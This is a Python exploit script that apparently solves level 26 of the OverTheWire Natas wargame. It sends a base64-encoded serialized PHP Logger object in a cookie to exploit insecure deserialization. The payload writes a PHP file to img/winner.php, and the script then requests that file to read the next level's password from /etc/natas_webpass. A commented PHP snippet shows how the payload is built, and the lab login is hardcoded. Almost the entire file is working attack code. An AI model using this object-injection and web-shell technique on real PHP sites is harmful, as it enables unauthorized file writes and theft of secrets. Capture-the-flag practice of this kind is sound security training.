import requests
import re
import urllib,base64

username ='natas26'
password ='oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'

url = 'http://%s.natas.labs.overthewire.org/' %username
session = requests.Session()
session.cookies.clear()


responce = requests.get(url,auth=(username,password))
# print(responce.cookies)

t1=responce.cookies["PHPSESSID"]

# cookies={"drawing":"Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3dpbm5lci5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo0MToiPD9waHAgY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3KTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo0MToiPD9waHAgY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3KTsgPz4iO30=","PHPSESSID":t1}
cookies={"drawing":"Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3dpbm5lci5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czoxMjc6Ijw/cGhwICRteWZpbGUgPSBmb3BlbigiL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjciLCAiciIpIG9yIGRpZSgiVW5hYmxlIHRvIG9wZW4gZmlsZSEiKTtlY2hvIGZnZXRzKCRteWZpbGUpO2ZjbG9zZSgkbXlmaWxlKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czoxMjc6Ijw/cGhwICRteWZpbGUgPSBmb3BlbigiL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjciLCAiciIpIG9yIGRpZSgiVW5hYmxlIHRvIG9wZW4gZmlsZSEiKTtlY2hvIGZnZXRzKCRteWZpbGUpO2ZjbG9zZSgkbXlmaWxlKTsgPz4iO30=","PHPSESSID":t1}

# print(cookies)
responce = requests.get(url+"?x=0&y=0&x2=500&y2=500",cookies=cookies,auth=(username,password))

# print(responce.text)

responce = requests.get(url+"img/winner.php",cookies=cookies,auth=(username,password))
print("password for natas 27 is = " + responce.text)







####################################php file for encodeing cookie is ######################################
# <?php
# class Logger{
#         private $logFile;
#         private $initMsg;
#         private $exitMsg;
      
#         function __construct(){
#             // initialise variables
#             $this->initMsg='<?php $myfile = fopen("/etc/natas_webpass/natas27", "r") or die("Unable to open file!");echo fgets($myfile);fclose($myfile); ?>';
#             $this->exitMsg='<?php $myfile = fopen("/etc/natas_webpass/natas27", "r") or die("Unable to open file!");echo fgets($myfile);fclose($myfile); ?>';
#             $this->logFile = "img/winner.php";
      
#             // write initial message
#             $fd=fopen($this->logFile,"a+");
#             fwrite($fd,$initMsg);
#             fclose($fd);
#         }                       
      
#         function log($msg){
#             $fd=fopen($this->logFile,"a+");
#             fwrite($fd,$msg."\n");
#             fclose($fd);
#         }                       
      
#         function __destruct(){
#             // write exit message
#             $fd=fopen($this->logFile,"a+");
#             fwrite($fd,$this->exitMsg);
#             fclose($fd);
#         }                       
#     }
    
# $object = new Logger();
# echo serialize($object);
# echo"\n";
# echo base64_encode(serialize($object));
# ?>